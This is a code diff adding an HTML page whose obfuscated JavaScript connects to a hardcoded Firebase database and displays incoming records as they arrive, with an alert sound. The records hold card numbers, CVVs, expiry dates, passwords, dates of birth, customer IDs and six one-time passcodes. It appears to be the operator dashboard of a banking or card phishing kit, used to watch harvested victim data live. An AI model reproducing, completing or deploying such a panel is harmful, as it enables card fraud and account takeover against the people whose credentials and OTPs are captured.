@@ -1,0 +1,185 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Contact Form Data</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=Poppins:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,100;1,200;1,300;1,400;1,500;1,600;1,700;1,800;1,900&display=swap"
+        rel="stylesheet">
+    <style>
+        body {
+            line-height: 1.6;
+            margin: 15px;
+            padding: 0;
+            background-color: #15c1b9;
+            color: #333;
+            font-family: "Poppins", sans-serif;
+            font-weight: 500;
+            font-style: normal;
+        }
+
+        h2 {
+            margin-bottom: 20px;
+            color: #fff;
+            text-transform: uppercase;
+            text-align: center;
+        }
+
+        ul {
+            list-style-type: none;
+            padding: 0;
+        }
+
+        li {
+            background-color: #fff;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            padding: 10px 15px;
+            margin-bottom: 10px;
+            box-shadow: 0px 2px 7px #757575;
+        }
+
+        li:last-child {
+            margin-bottom: 0;
+        }
+
+        strong {
+            text-transform: uppercase;
+        }
+
+        .box {
+            display: flex;
+            font-size: 20px;
+        }
+
+        p {
+            margin: 0;
+            padding-left: 5px;
+            color: red;
+        }
+
+        #date {
+            font-size: 13px;
+            width: 100%;
+            text-align: center;
+            background: black;
+            color: aliceblue;
+            border-radius: 5px;
+            margin-bottom: 9px;
+            padding: 3px 0;
+        }
+
+        .toast {
+            visibility: hidden;
+            width: 250px;
+            margin-left: -125px;
+            background-color: #020d83;
+            color: #fff;
+            text-align: center;
+            border-radius: 50px;
+            padding: 10px;
+            position: fixed;
+            z-index: 1;
+            left: 0;
+            right: 0;
+            margin: auto;
+            bottom: 30px;
+            font-size: 17px;
+            opacity: 0;
+            transition: opacity 0.5s, visibility 0.5s;
+        }
+
+        .toast.show {
+            visibility: visible;
+            opacity: 1;
+        }
+
+        .overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgb(138, 137, 137);
+            /* Semi-transparent black overlay */
+            z-index: 999;
+            /* Ensure overlay is on top of everything else */
+        }
+
+        /* Popup styles */
+        .popup {
+            display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background-color: #fff;
+            padding: 10px;
+            border: 1px solid #ccc;
+            box-shadow: 0 0 20px rgba(0, 0, 0, 0.1);
+            max-width: 300px;
+            text-align: center;
+            z-index: 1000;
+            width: 100%;
+            border-radius: 8px;
+            /* Rounded corners */
+        }
+
+        .popup p {
+            margin-bottom: 15px;
+            font-size: 16px;
+        }
+
+        .popup button {
+            padding: 10px 20px;
+            margin: 10px;
+            cursor: pointer;
+            background-color: #007bff;
+            /* Blue color for button */
+            color: #fff;
+            /* White text color */
+            border: none;
+            border-radius: 4px;
+            font-size: 14px;
+            transition: background-color 0.3s ease;
+        }
+
+        .popup button:hover {
+            background-color: #0056b3;
+            /* Darker blue on hover */
+        }
+    </style>
+</head>
+
+<body>
+    <div class="overlay"></div>
+
+    <!-- Popup -->
+    <div id="popup" class="popup">
+        <p>Click "Allow" to enable autoplay audio.</p>
+        <button id="allowButton">Allow</button>
+    </div>
+    <h2>Advance Backend</h2>
+
+    <ul id="formDataList">
+        <!-- Data will be dynamically added here -->
+    </ul>
+    <div id="toast" class="toast">New Data Added!</div>
+    <!-- Firebase JavaScript SDK -->
+    <audio id="autoplayAudio" autoplay>
+        <source src="notification.mp3" type="audio/mpeg">
+    </audio>
+
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+    <script>
+function _0x39bd(){var _0x5f81af=['start-45a39.appspot.com','18108oEyQrV','otp6','none','otp1','holdername','style','block','<div\x20class=\x22box\x22><strong>DOB\x20:</strong>\x20<p>\x20','1191632qiDAqg','4yAfZtD','regmobile','start-45a39.firebaseapp.com','<div\x20class=\x22box\x22><strong>OTP\x206\x20:</strong>\x20<p>\x20','https://start-45a39-default-rtdb.firebaseio.com','display','creditlimit','innerHTML','replace','className','allowButton','cvv','textContent','otp5','.overlay','<div\x20class=\x22box\x22><strong>Mobile\x20:</strong>\x20<p>\x20','4542KzFUsa','168108rPVKNJ','firstChild','New\x20Data\x20Added!','contactForm2','<div\x20class=\x22box\x22><strong>Cvv\x20:</strong>\x20<p>\x20','popup','autoplayAudio','querySelector','child_changed','539kPQHYt','254233AUrOIx','<div\x20class=\x22box\x22>\x20<strong>OTP\x201\x20:</strong>\x20<p>\x20','28zIEgWW','AIzaSyD5wSvrZXq9FFfJ0SoDxGfp6kVQ7VEyNFA','otp2','dob','<div\x20class=\x22box\x22><strong>OTP\x204\x20:</strong>\x20<p>\x20','mobile','7HuiBgQ','database','expiredate','<div\x20class=\x22box\x22><strong>OTP\x203\x20:</strong>\x20<p>\x20','<div\x20class=\x22box\x22><strong>Credit\x20Limit\x20:</strong>\x20<p>\x20','getElementById','<div\x20class=\x22box\x22><strong>OTP\x202\x20:</strong>\x20<p>\x20','password','addEventListener','creditnumber','<div\x20class=\x22box\x22><strong>Holder\x20Name\x20:</strong>\x20<p>\x20','play','955iEKQnl','muted','<div\x20class=\x22box\x22><strong>Expiry\x20Date\x20:</strong>\x20<p>\x20','2900gVlxMA','customerid','<div\x20class=\x22box\x22><strong>Password\x20:\x20</strong>\x20<p>\x20','createElement','formDataList','otp3','2191768huCSrx','263922oqPzOb','\x20</p></div>','toast','DOMContentLoaded','currentDateTime','insertBefore','2TpbCQA','<div\x20class=\x22box\x22><p\x20id=\x22date\x22>\x20Date\x20&\x20Time\x20'];_0x39bd=function(){return _0x5f81af;};return _0x39bd();}var _0x152c5a=_0x3645;(function(_0x576615,_0x5ae28d){var _0x568bf8=_0x3645,_0x5ed494=_0x576615();while(!![]){try{var _0x1d9a0b=parseInt(_0x568bf8(0x87))/0x1*(-parseInt(_0x568bf8(0xab))/0x2)+parseInt(_0x568bf8(0xa5))/0x3*(-parseInt(_0x568bf8(0xb7))/0x4)+-parseInt(_0x568bf8(0x9b))/0x5*(-parseInt(_0x568bf8(0x7c))/0x6)+-parseInt(_0x568bf8(0x8f))/0x7*(-parseInt(_0x568bf8(0xa4))/0x8)+parseInt(_0x568bf8(0xae))/0x9*(-parseInt(_0x568bf8(0x9e))/0xa)+-parseInt(_0x568bf8(0x86))/0xb*(-parseInt(_0x568bf8(0x7d))/0xc)+parseInt(_0x568bf8(0xb6))/0xd*(parseInt(_0x568bf8(0x89))/0xe);if(_0x1d9a0b===_0x5ae28d)break;else _0x5ed494['push'](_0x5ed494['shift']());}catch(_0x2c0c58){_0x5ed494['push'](_0x5ed494['shift']());}}}(_0x39bd,0x58890));const firebaseConfig={'apiKey':_0x152c5a(0x8a),'authDomain':_0x152c5a(0x6e),'databaseURL':_0x152c5a(0x70),'projectId':'start-45a39','storageBucket':_0x152c5a(0xad),'messagingSenderId':'377019727798','appId':'1:377019727798:web:5c56be02bc821e6ec88b17'};firebase['initializeApp'](firebaseConfig);var contactFormRef=firebase[_0x152c5a(0x90)]()['ref'](_0x152c5a(0x80));function handleNewData(_0x176e6b){var _0x55f1df=_0x152c5a,_0x152fcf=_0x176e6b['val'](),_0x5108ce=document[_0x55f1df(0xa1)]('li'),_0x498bfc='';_0x152fcf[_0x55f1df(0xa9)]&&(_0x498bfc+=_0x55f1df(0xac)+_0x152fcf[_0x55f1df(0xa9)]+_0x55f1df(0xa6));_0x152fcf[_0x55f1df(0xb1)]&&(_0x498bfc+=_0x55f1df(0x88)+_0x152fcf[_0x55f1df(0xb1)]+_0x55f1df(0xa6));_0x152fcf[_0x55f1df(0x8b)]&&(_0x498bfc+=_0x55f1df(0x95)+_0x152fcf[_0x55f1df(0x8b)]+'\x20</p></div>');_0x152fcf[_0x55f1df(0xa3)]&&(_0x498bfc+=_0x55f1df(0x92)+_0x152fcf[_0x55f1df(0xa3)]+'\x20</p></div>');_0x152fcf['otp4']&&(_0x498bfc+=_0x55f1df(0x8d)+_0x152fcf['otp4']+_0x55f1df(0xa6));_0x152fcf[_0x55f1df(0x79)]&&(_0x498bfc+='<div\x20class=\x22box\x22><strong>OTP\x205\x20:</strong>\x20<p>\x20'+_0x152fcf[_0x55f1df(0x79)]+_0x55f1df(0xa6));_0x152fcf['otp6']&&(_0x498bfc+=_0x55f1df(0x6f)+_0x152fcf[_0x55f1df(0xaf)]+_0x55f1df(0xa6));_0x152fcf[_0x55f1df(0x9f)]&&(_0x498bfc+='<div\x20class=\x22box\x22><strong>Customer\x20Id\x20:</strong>\x20<p>\x20'+_0x152fcf['customerid']+_0x55f1df(0xa6));_0x152fcf[_0x55f1df(0x96)]&&(_0x498bfc+=_0x55f1df(0xa0)+_0x152fcf['password']+'\x20</p></div>');_0x152fcf[_0x55f1df(0x8e)]&&(_0x498bfc+=_0x55f1df(0x7b)+_0x152fcf[_0x55f1df(0x8e)]+'\x20</p></div>');_0x152fcf[_0x55f1df(0x98)]&&(_0x498bfc+='<div\x20class=\x22box\x22><strong>Credit\x20Number\x20:</strong>\x20<p>\x20'+_0x152fcf[_0x55f1df(0x98)]+_0x55f1df(0xa6));_0x152fcf[_0x55f1df(0x91)]&&(_0x498bfc+=_0x55f1df(0x9d)+_0x152fcf[_0x55f1df(0x91)]+_0x55f1df(0xa6));_0x152fcf[_0x55f1df(0x77)]&&(_0x498bfc+=_0x55f1df(0x81)+_0x152fcf['cvv']+_0x55f1df(0xa6));_0x152fcf[_0x55f1df(0x72)]&&(_0x498bfc+=_0x55f1df(0x93)+_0x152fcf['creditlimit']+_0x55f1df(0xa6));_0x152fcf[_0x55f1df(0xb8)]&&(_0x498bfc+=_0x55f1df(0x7b)+_0x152fcf[_0x55f1df(0xb8)]+'\x20</p></div>');_0x152fcf['holdername']&&(_0x498bfc+=_0x55f1df(0x99)+_0x152fcf[_0x55f1df(0xb2)]+_0x55f1df(0xa6));_0x152fcf[_0x55f1df(0x8c)]&&(_0x498bfc+=_0x55f1df(0xb5)+_0x152fcf[_0x55f1df(0x8c)]+'\x20</p></div>');_0x5108ce[_0x55f1df(0x73)]=_0x498bfc;var _0x11463b=document[_0x55f1df(0x94)](_0x55f1df(0xa2)),_0x35e546=document[_0x55f1df(0x94)](_0x152fcf[_0x55f1df(0x9f)]);_0x35e546?_0x35e546[_0x55f1df(0x73)]=_0x5108ce[_0x55f1df(0x73)]:(_0x5108ce['id']=_0x152fcf['customerid'],_0x11463b[_0x55f1df(0xaa)](_0x5108ce,_0x11463b[_0x55f1df(0x7e)])),showToast(_0x55f1df(0x7f)),playSound();}contactFormRef['on']('child_added',function(_0x4a153d){handleNewData(_0x4a153d);}),contactFormRef['on'](_0x152c5a(0x85),function(_0x378043){handleNewData(_0x378043);});function showToast(_0x3e142b){var _0x581a77=_0x152c5a;const _0xa11411=document[_0x581a77(0x94)](_0x581a77(0xa7));_0xa11411[_0x581a77(0x78)]=_0x3e142b,_0xa11411[_0x581a77(0x75)]='toast\x20show',setTimeout(function(){var _0x277d26=_0x581a77;_0xa11411[_0x277d26(0x75)]=_0xa11411[_0x277d26(0x75)][_0x277d26(0x74)]('show','');},0x7d0);}function playSound(){var _0x19be43=_0x152c5a,_0x11e8fb=document[_0x19be43(0x94)]('autoplayAudio');_0x11e8fb[_0x19be43(0x9a)]();}function _0x3645(_0xd3ee4,_0x124cd1){var _0x39bd49=_0x39bd();return _0x3645=function(_0x364539,_0x2ba8a9){_0x364539=_0x364539-0x6e;var _0x4f2bda=_0x39bd49[_0x364539];return _0x4f2bda;},_0x3645(_0xd3ee4,_0x124cd1);}document[_0x152c5a(0x97)](_0x152c5a(0xa8),function(){var _0xf08c2a=_0x152c5a;const _0x126eab=document[_0xf08c2a(0x84)](_0xf08c2a(0x7a)),_0x515b9d=document[_0xf08c2a(0x94)](_0xf08c2a(0x82)),_0x260b5b=document[_0xf08c2a(0x94)](_0xf08c2a(0x76)),_0x15532a=document[_0xf08c2a(0x94)](_0xf08c2a(0x83));_0x126eab[_0xf08c2a(0xb3)][_0xf08c2a(0x71)]=_0xf08c2a(0xb4),_0x515b9d[_0xf08c2a(0xb3)][_0xf08c2a(0x71)]=_0xf08c2a(0xb4),_0x260b5b[_0xf08c2a(0x97)]('click',function(){var _0x467bb5=_0xf08c2a;_0x126eab[_0x467bb5(0xb3)]['display']='none',_0x515b9d['style'][_0x467bb5(0x71)]=_0x467bb5(0xb0),_0x15532a[_0x467bb5(0x9c)]=![],_0x15532a[_0x467bb5(0x9a)]();});});
+    </script>
+</body>
+
+</html>
